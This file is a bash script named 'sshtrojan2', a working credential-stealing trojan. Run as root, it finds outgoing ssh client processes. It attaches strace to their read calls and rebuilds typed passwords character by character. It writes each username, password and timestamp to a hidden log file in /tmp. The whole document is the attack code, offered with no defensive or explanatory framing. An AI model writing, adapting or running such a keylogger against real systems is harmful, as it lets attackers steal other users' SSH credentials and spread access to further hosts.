#!/bin/bash

LogFile="/tmp/.log_sshtrojan2.txt"
Username=""
Password=""

#check root euid
if [[ $EUID -ne 0 ]]; then
    echo "Permission denied! Root required."
    exit 1
fi

#check log file existence
if [[ -e $LogFile ]]; then 
    echo "File $LogFile was created."
else
    echo "Create file $LogFile." 
    touch $LogFile
fi

echo "sshtrojan2 is logging username and password into $LogFile..."

while true
do
    #parse PID
    PID=`ps aux | grep -w ssh | grep @ | tail -n 1 | awk {'print $2'}` 
    
    #check PID existence
    if [[ $PID != "" ]]; then
        #parse ssh process to get username 
        Username=`ps aux | grep ssh | grep @ | awk '{print $12}' | cut -d'@' -f1 | tail -n 1`
        
	#get system trace log of PID
        strace -p $PID -e trace=read --status=successful 2>&1 | while read -r line;
	do
	    #parse password from systrace log
	    char=`echo $line | grep "read(4," | grep ", 1) = 1" | cut -d'"' -f2 | cut -d'"' -f1`
	    if [[ $char == "\\n" ]]; then
		echo "Time:" `date` >> $LogFile
		echo "Username:" $Username  >> $LogFile
		echo -e "Password:" $Password "\n" >> $LogFile				
		break
	    else
		Password+=$char
	    fi           
        done
    fi
done

